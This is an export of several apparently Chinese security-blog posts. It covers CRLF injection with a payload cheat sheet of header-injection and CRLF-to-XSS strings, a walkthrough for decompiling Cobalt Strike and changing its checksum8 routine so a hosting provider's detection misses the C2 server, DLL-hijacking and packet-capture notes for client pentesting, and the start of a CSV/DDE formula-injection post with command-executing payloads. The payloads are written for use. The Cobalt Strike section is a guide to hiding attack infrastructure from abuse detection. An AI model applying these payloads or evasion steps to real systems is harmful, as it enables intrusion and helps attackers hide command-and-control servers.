<p>CRLF注入漏洞，是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞（HTTP Response Splitting）。</p>
<h2 id="0x01-具体场景"><a href="#0x01-具体场景" class="headerlink" title="0x01 具体场景"></a>0x01 具体场景</h2><p>通过修改HTTP参数或URL，注入恶意的CRLF，查看构造的恶意数据是否在响应头中输出。</p>
<p>看一个例子：</p>
<ol>
<li>修改参数，注入 <code>%0d%0aSet-Cookie:crlf=true</code></li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/CRLF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210710203814579.png" alt="image-20210710203814579"></p>
<ol start="2">
<li>查看响应包的信息</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/CRLF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210710204006526.png" alt="image-20210710204006526"></p>
<p>可以看到恶意数据在响应头中输出。</p>
<ol start="3">
<li>查看服务端源码</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/CRLF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210710204228325.png" alt="image-20210710204228325"></p>
<p>HTTP规范中，行以CRLF结束。所以当检测到%0d%0a后，就认为Location首部字段这行结束了，Set-Cookie就会被认为是下一行，我们构造的Set-Cookie字符在HTTP中是一个设置Cookie的首部字段，这个时候就会将crlf&#x3D;true设置成Cookie。</p>
<h2 id="0x02-CRLF拓展"><a href="#0x02-CRLF拓展" class="headerlink" title="0x02 CRLF拓展"></a>0x02 CRLF拓展</h2><p><strong>基于header测试根目录</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0d%0aheader:header</span><br><span class="line">%0aheader:header</span><br><span class="line">%0dheader:header</span><br><span class="line">%23%0dheader:header</span><br><span class="line">%3f%0dheader:header</span><br><span class="line">/%250aheader:header</span><br><span class="line">/%25250aheader:header</span><br><span class="line">/%%0a0aheader:header</span><br><span class="line">/%3f%0dheader:header</span><br><span class="line">/%23%0dheader:header</span><br><span class="line">/%25%30aheader:header</span><br><span class="line">/%25%30%61header:header</span><br><span class="line">/%u000aheader:header</span><br></pre></td></tr></table></figure>

<p><strong>CRLF与Open Redirect服务器配置错误</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//www.google.com/%2f%2e%2e%0d%0aheader:header</span><br><span class="line">/www.google.com/%2e%2f%0d%0aheader:header</span><br><span class="line">/google.com/%2F..%0d%0aheader:header</span><br><span class="line"></span><br><span class="line">//	%2f：/</span><br><span class="line">//	%2e: .</span><br></pre></td></tr></table></figure>

<p><strong>Twitter 特殊的 CRLF</strong> by <a href="http://blog.innerht.ml/twitter-crlf-injection/">@filedescriptor</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%E5%98%8A%E5%98%8Dheader:header</span><br></pre></td></tr></table></figure>

<p><strong>CRLF Injection 到 XSS</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a&lt;svg%20onload=alert(document.domain)&gt;%0d%0a0%0d%0a/%2e%2e</span><br></pre></td></tr></table></figure>

<p><strong>在302跳转响应之前</strong> (Discovered in DoD)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert(&#x27;XSS&#x27;);%3C%2fscript%3E</span><br></pre></td></tr></table></figure>

<p><strong>响应拆分301代码，与Open Redirect链接以破坏header位置并打破301</strong> by <a href="https://twitter.com/black2fan">@black2fan</a> (Facebook bug)</p>
<p><em>注意：</em><code>xxx：1</code>用于打开重定向目的地（header头）。 很好的例子如何将CRLF升级到XSS，这似乎是不可利用的301状态代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/script%3e%2F..%2F..%2F..%2F../tr</span><br></pre></td></tr></table></figure>

<h2 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p>过滤 \r 、\n 之类的行结束符，避免输入的数据污染其他 HTTP 首部字段。</p>
<h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a href="https://www.hacking8.com/bugbounty-cheatsheet/cheatsheets/crlf.html">https://www.hacking8.com/bugbounty-cheatsheet/cheatsheets/crlf.html</a></p>
<p><a href="https://www.cnblogs.com/uestc2007/p/10880338.html">https://www.cnblogs.com/uestc2007/p/10880338.html</a></p>
]]></content>
      <categories>
        <category>漏洞总结</category>
      </categories>
      <tags>
        <tag>基础漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>CS4.4 绕过vultr特征检测修改checksum8算法</title>
    <url>/posts/e702d1b6.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为 CS 被 vultr 检测到了，听到要把我封号，有点小慌，吓得我立马把vps删了😅，所以查找了一下解决方法。</p>
<p>在这里记录一下成功反编译 CS，修改 checksum8 算法的过程。</p>
<p>思路来自这里：</p>
<p><a href="https://blog.csdn.net/qq_35938621/article/details/122366079?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_35938621/article/details/122366079?spm=1001.2014.3001.5501</a></p>
<p>但有些地方和这篇文章不太一样，因为我按照上面的方法尝试了一遍，没有复现成功。但只要你按照我这篇文章来，百分百成功。</p>
<h2 id="反编译-CS"><a href="#反编译-CS" class="headerlink" title="反编译 CS"></a>反编译 CS</h2><p>我这里使用的是 java 在线反编译网站，而不是自己下载反编译工具（因为使用了一下反编译工具，效果都不太好，所以推荐使用在线工具）</p>
<p>link：<a href="http://www.javadecompilers.com/">http://www.javadecompilers.com/</a></p>
<p>打开网站，上传 <code>conbaltstrike.jar</code> 文件，选择 <code>CFR</code> 反编译工具，点击 <code>Upload and Decompile</code> 上传和反编译。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504190012925.png" alt="image-20220504190012925" style="zoom:50%;" />

<p>然后就是等待几分钟吧，它完成了之后不会提示你完成了，你需要按一下 <code>F5</code> 刷新一下网页，如果成功了，点击下载即可。</p>
<h2 id="修改-checksum8-算法"><a href="#修改-checksum8-算法" class="headerlink" title="修改 checksum8 算法"></a>修改 checksum8 算法</h2><h3 id="项目和环境配置"><a href="#项目和环境配置" class="headerlink" title="项目和环境配置"></a>项目和环境配置</h3><p>编译器使用的是 <code>IDEA</code>，用不惯英文的可以去装个中文插件。打开 <code>IDEA</code> ，右上角新建项目，java 版本最好为 1.8，因为兼容性好。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504191220732.png" alt="image-20220504191220732" style="zoom:50%;" />

<p>下一步，下一步</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504191339420.png" alt="image-20220504191339420" style="zoom:50%;" />

<p>项目名称为 <code>cobaltstrike</code>,放在哪里都 ok，点击完成。</p>
<p>新建两个文件夹：<code>decompiled_src</code> 和 <code>lib</code>。前者放从网站上下载好已解压的 CS 文件，后者放 <code>cobaltstrike.jar</code> 文件（也就是上传到网站上进行反编译的文件）</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504191601664.png" alt="image-20220504191601664" style="zoom:50%;" />

<p>然后 <code>checksum8 </code> 算法的位置在 <code>decompiled_src/cloudstrike/WebServer.java</code> 和 <code>decompiled_src/common/CommonUtils.java</code> 这两个文件中，所以需要把他们连带他们的父文件夹一起复制过来，如上图所示。</p>
<p>接下来设置环境：</p>
<p>左上角 文件→项目结构</p>
<p>项目不需要做修改：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504192239289.png" alt="image-20220504192239289" style="zoom:50%;" />

<p>模块的话选择依赖，<code>依赖</code>下方的 <code>+</code> 号，选择 <code>Jar 或目录</code>，选择 <code>lib/conbaltstrike.jar</code>,然后勾选，点击应用。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504192603938.png" alt="image-20220504192603938" style="zoom:50%;" />

<p>然后点击<strong>「工件→JAR→来自有依赖项的模块→然后选择 Aggressor」</strong> 出现<strong>「aggressor.Aggressor」</strong>就说明正确了，然后确定，工件就设置完成了</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504193229455.png" alt="image-20220504193229455" style="zoom:50%;" />

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504193256603.png" alt="image-20220504193256603" style="zoom:50%;" />

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504193410696.png" alt="image-20220504193410696" style="zoom:50%;" />

<p>其他的都没什么问题</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504193341668.png" alt="image-20220504193341668" style="zoom:50%;" />

<h3 id="解决反编译后带来的错误"><a href="#解决反编译后带来的错误" class="headerlink" title="解决反编译后带来的错误"></a>解决反编译后带来的错误</h3><p>因为反编译肯定会有错误的地方，第一步先解决编译的报错先。</p>
<p><strong>点击工具栏上方 构建→构建工件」</strong>，然后点击<strong>「构建」</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/CS4.4%E7%BB%95%E8%BF%87vultr%E7%89%B9%E5%BE%81%E6%A3%80%E6%B5%8B%E4%BF%AE%E6%94%B9checksum8%E7%AE%97%E6%B3%95/image-20220504193801430.png" alt="image-20220504193801430"></p>
<p><code>WebServer.java</code>里面 第44 行有一个，第268行有一个</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/CS4.4%E7%BB%95%E8%BF%87vultr%E7%89%B9%E5%BE%81%E6%A3%80%E6%B5%8B%E4%BF%AE%E6%94%B9checksum8%E7%AE%97%E6%B3%95/image-20220504194153462.png" alt="image-20220504194153462"></p>
<p>第44行：单击 for ，按 <code>Alt</code> + <code>Enter</code> 键，点击 <code>替换为 ‘Map.forEach()’ </code>结果如下图：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504194710764.png" alt="image-20220504194710764" style="zoom:50%;" />

<p>第268行：单击 for ，按 <code>Alt</code> + <code>Enter</code> 键，点击，<code>将for-each 循环替换为迭代器‘for’循环</code>,</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/CS4.4%E7%BB%95%E8%BF%87vultr%E7%89%B9%E5%BE%81%E6%A3%80%E6%B5%8B%E4%BF%AE%E6%94%B9checksum8%E7%AE%97%E6%B3%95/image-20220504195000584.png" alt="image-20220504195000584"></p>
<p>还有错误，同理 点击左边的红灯，点击 <code>转换到 &#39;java.util.Map.Entry&#39;</code> 。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/CS4.4%E7%BB%95%E8%BF%87vultr%E7%89%B9%E5%BE%81%E6%A3%80%E6%B5%8B%E4%BF%AE%E6%94%B9checksum8%E7%AE%97%E6%B3%95/image-20220504195134498.png" alt="image-20220504195134498"></p>
<p>然后结果如下图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/CS4.4%E7%BB%95%E8%BF%87vultr%E7%89%B9%E5%BE%81%E6%A3%80%E6%B5%8B%E4%BF%AE%E6%94%B9checksum8%E7%AE%97%E6%B3%95/image-20220504195258151.png" alt="image-20220504195258151"></p>
<p>接下来看 <code>CommonUtils.java</code> 文件，错误出现在 第1563 行</p>
<p>同理都是先将 <code>for-each 循环改变为 迭代器 ‘for’ 循环</code></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504195523368.png" alt="image-20220504195523368" style="zoom:67%;" />

<p>然后又是点击 <code>转换到 &#39;java.util.Map.Entry&#39;</code> </p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504195716256.png" alt="image-20220504195716256" style="zoom:67%;" />

<p>到这里就没有错误了，nice。</p>
<h3 id="修改-checksum8-算法-1"><a href="#修改-checksum8-算法-1" class="headerlink" title="修改 checksum8 算法"></a>修改 checksum8 算法</h3><p>checksum8 算法脚本</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EchoTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">long</span> <span class="title function_">checksum8</span><span class="params">(String text)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (text.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        text = text.replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>; x &lt; text.length(); x++) &#123;</span><br><span class="line">            sum += text.charAt(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(checksum8(<span class="string">&quot;fega&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在线运行 java 网站：</p>
<p><a href="https://c.runoob.com/compile/10/">https://c.runoob.com/compile/10/</a></p>
<p>运行结果：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504200640433.png" alt="image-20220504200640433" style="zoom:50%;" />

<p><code>fega</code> 可随意改变，但最好是四位字符（英文字符+数字），因为按着他的来没有成功，很玄学，也可能是我们反编译的源码不太一样。</p>
<p>定位到 checksum8 代码的位置，我所作的修改如下：</p>
<p><code>WebServer.java</code>文件中：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504200149610.png" alt="image-20220504200149610" style="zoom:50%;" />

<p><code>CommonUtils.java</code> 文件中：92L和93L不需要改变，改变 return 的返回值即可。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504201601819.png" alt="image-20220504201601819" style="zoom:50%;" />

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/CS4.4%E7%BB%95%E8%BF%87vultr%E7%89%B9%E5%BE%81%E6%A3%80%E6%B5%8B%E4%BF%AE%E6%94%B9checksum8%E7%AE%97%E6%B3%95/image-20220504201652592.png" alt="image-20220504201652592"></p>
<p>最后上线成功，特征码也消失了：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504201414175.png" alt="image-20220504201414175" style="zoom:50%;" />

<p>大于四位数不能上线：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CS4.4绕过vultr特征检测修改checksum8算法/image-20220504202251383.png" alt="image-20220504202251383" style="zoom:50%;" />

<p>可能和这里有关，但我们不需要关心。</p>
<p>因为 vultr 是依据特征码进行检测的，比如 <code>aaa9</code>,所以4位数也足够安全了，有 2^62^ 种可能性，不可能依靠穷举找到我们。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>java 菜鸡学会了个小技能，反编译 cs。</p>
]]></content>
      <categories>
        <category>RedTeam</category>
      </categories>
      <tags>
        <tag>流量隐藏技术</tag>
        <tag>CS</tag>
      </tags>
  </entry>
  <entry>
    <title>C/S架构客户端渗透</title>
    <url>/posts/20ee169f.html</url>
    <content><![CDATA[<blockquote>
<p>  cs-checklist</p>
<p>  <a href="https://github.com/theLSA/CS-checklist">https://github.com/theLSA/CS-checklist</a></p>
</blockquote>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在过去的一次 C&#x2F;S 客户端渗透过程中，由于是第一次渗透C&#x2F;S客户端，所以有很多不足的地方，在这里记录学习一下如何渗透 C&#x2F;S 客户端。</p>
<p>C&#x2F;S 渗透与 Web 渗透最大的不同就是 C&#x2F;S 客户端可能存在 TCP、UDP 协议，你使用 proxifier 等抓包工具是抓不到那些请求的，所以如果止步于 Web 渗透的手段，是没办法完整的完成渗透测试的。</p>
<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>C&#x2F;S 客户端渗透需要准备下列的工具：</p>
<p><strong>burp</strong></p>
<p><strong>proxifier</strong></p>
<p><strong>wireshark或者火绒剑</strong></p>
<p>proxifier 用来做代理抓客户端的https包</p>
<p>wireshark或者火绒剑是用来抓tcp或者udp的包</p>
<h2 id="C-x2F-S架构渗透"><a href="#C-x2F-S架构渗透" class="headerlink" title="C&#x2F;S架构渗透"></a><strong>C&#x2F;S架构渗透</strong></h2><h3 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>这部分主要取决于windows系统dll加载机制。dll文件的加载顺序为：</p>
<p>(1)EXE所在目录；</p>
<p>(2)当前目录；</p>
<p>(3)系统目录；</p>
<p>(4)WINDOWS目录；</p>
<p>(5)环境变量 PATH 所包含的目录。</p>
<p>这就导致我们可以让我们自己编写的同名dll在正常dll之前进行进行加载。</p>
<p><strong>部分dll无法劫持的原因</strong></p>
<p>1.dll采用绝对路径方式加载（这种方式极少）</p>
<p>2.windows新系统采用knowndlls方式保护的dll，可以通过以下路径查看被保护的dll是哪些</p>
<p>计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</p>
<h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><ol>
<li>首先利用<strong>火绒剑</strong>监控分析一下客户端启动时调用的dll。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/CS%E6%9E%B6%E6%9E%84%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20220927113031261.png" alt="image-20220927113031261"></p>
<ol start="2">
<li>筛选 cloudmusic.exe 调用的 dll 文件，过滤-&gt;动作过滤-&gt;FILE_open</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/CS%E6%9E%B6%E6%9E%84%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/image-20220927113409597.png" alt="image-20220927113409597"></p>
<ol start="3">
<li>排除knowdlls记录的dll后，把其他的dll拷贝的应用的目录下，再重新监控一次加载的dll文件</li>
</ol>
<p>如果加载的是应用目录下的dll文件，那么就可以用来进行dll劫持了。</p>
<p>（这是一张图片）</p>
<ol start="4">
<li>劫持dll</li>
</ol>
<p>由于利用部分篇幅长且笔者没有进行尝试，所以暂时掠过，可以参考下方文章链接进行利用</p>
<p><a href="https://mp.weixin.qq.com/s/liv4S4rqQwiD0yecnNisNA">https://mp.weixin.qq.com/s/liv4S4rqQwiD0yecnNisNA</a></p>
<h3 id="抓包测试"><a href="#抓包测试" class="headerlink" title="抓包测试"></a>抓包测试</h3><p>一般来说流量的走向是 客户端——&gt;proxifier——&gt;burpsuite。</p>
<p>但是有些客户端不能通过 proxifier 进行代理，就算它有https连接，你也抓不到，一片红，不信你用proxifier抓一下网易云，就是这么亏贼，当时还重新安装了几次proxifier。</p>
<p>所以我们可以客户端+系统的全局代理+burpsuite，这样子抓包，然后在burp中设置只拦截目标IP。</p>
<p>火绒剑的作用是更加清晰的看到进程的网络连接，wireshark的作用是精准的查看数据包，两者互补。</p>
<p>火绒剑适用的场景是，查看客户端与哪个ip在建立连接，比如知道mysql的用户名和密码之后，需要找到mysql的ip。缺点是无法复制详细的数据包。</p>
<p>在火绒剑发现需要重发测试的数据包后，使用wireshark的适用场景是抓取抓不到的包，然后放到burpsuite上修改重发。</p>
<p>wireshark 查看数据包的方式也很简单，只需要筛选出目标数据包，然后右键追踪流选择 TCP&#x2F;UDP&#x2F;HTTP 流，就可看到了，复制到burpsuite上，加上目标host和端口，重新发送即可。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当然 C&#x2F;S 渗透还有反编译客户端，但那不是我擅长的，所以就不写了，掌握前两者已经能满足基本的 C&#x2F;S 渗透要求了。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/I60E1VRVQEj0tX_2N-Hzmw">https://mp.weixin.qq.com/s/I60E1VRVQEj0tX_2N-Hzmw</a></p>
<p><a href="https://mp.weixin.qq.com/s/liv4S4rqQwiD0yecnNisNA">https://mp.weixin.qq.com/s/liv4S4rqQwiD0yecnNisNA</a></p>
<p>自动化枚举工具</p>
<p><a href="https://3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95">https://3gstudent.github.io/DLL%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7Rattler%E6%B5%8B%E8%AF%95</a></p>
<p>有个编译好的弹计算机的 dll</p>
<p><a href="https://github.com/sensepost/rattler">https://github.com/sensepost/rattler</a></p>
<p>一种分析特权进程的文件和目录的工具，通过DLL Hijacking via version.cpp 和version.def 文件找出进程是否容易受到DLL 劫持。</p>
<p><a href="https://securityonline.info/spartacus-dll-hijacking-discovery-tool/">https://securityonline.info/spartacus-dll-hijacking-discovery-tool/</a></p>
<p>dll挖掘入门</p>
<p><a href="https://tttang.com/archive/1365/">https://tttang.com/archive/1365/</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title>CSV 注入总结</title>
    <url>/posts/c4ebf98a.html</url>
    <content><![CDATA[<h1 id="CSV注入"><a href="#CSV注入" class="headerlink" title="CSV注入"></a>CSV注入</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p><strong>CSV公式注入(CSV Injection）</strong>是一种会造成巨大影响的攻击向量。攻击包含向恶意的EXCEL公式中注入可以输出或以CSV文件读取的参数。当在Excel中打开CSV文件时，文件会从CSV描述转变为原始的Excel格式，包括Excel提供的所有动态功能。在这个过程中，CSV中的所有Excel公式都会执行。当该函数有合法意图时，很易被滥用并允许恶意代码执行。</p>
<p>现在很多应用提供了导出电子表格的功能（不限于 Web 应用），早在 2014 年 8月 29 日国外 James Kettle 便发表了《Comma Separated Vulnerabilities》文章来讲述导出表格的功能可能会导致注入命令的风险，因为导出的表格数据有很多是来自于用户控制的，如：投票应用、邮箱导出。攻击方式类似于 XSS ：所有的输入都是不可信的。</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>我们知道在 Excel 中是可以运行计算公式的： &#x3D;1+5 ，它会将以 &#x3D; 开头的单元格内容解释成公式并运行，单纯的运行计算公式可能没什么用，但这里可以用到 DDE 。<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms648774(v=vs.85).aspx">Dynamic Data Exchange</a>（DDE）是一款来自微软的古老技术，它是 Windows 下的一种跨进程通信的协议，支持 Microsoft Excel， LibreOffice 和 Apache OpenOffice。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/CSV%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210710210755769.png" alt="image-20210710210755769"></p>
<p>虽然单元格的内容在引号内，但由于第一个字符是**&#x3D;**，它以一个表达式的形式被处理，实际上包括 **&#x3D; - + @**这样的符号都会触发这种行为，正常来说，如果数据量比较大的情况下，管理员一般不会花那么多时间去一个个检查输入内容是否正常。</p>
<p>执行 cmd 弹出计算器:</p>
<p>我们把输入内容修改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=1+cmd|&#x27;/C calc&#x27;!A0</span><br><span class="line">或%0A-3+3+cmd|&#x27;/C calc&#x27;!D2</span><br></pre></td></tr></table></figure>

<p>之后点击保存，然后再次打开，会看到如下提示：f</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/CSV%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210710210900816.png" alt="image-20210710210900816"></p>
<p>点击 <strong>是</strong> 之后，弹出计算器：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CSV注入漏洞总结/image-20210710210917378.png" alt="image-20210710210917378" style="zoom:50%;" />

<p>这个问题在2014年进行了修复（CVE-2014-3524），所以我们现在注入命令执行时软件会有如下的提示：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/CSV%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/image-20210710212437135.png" alt="image-20210710212437135"></p>
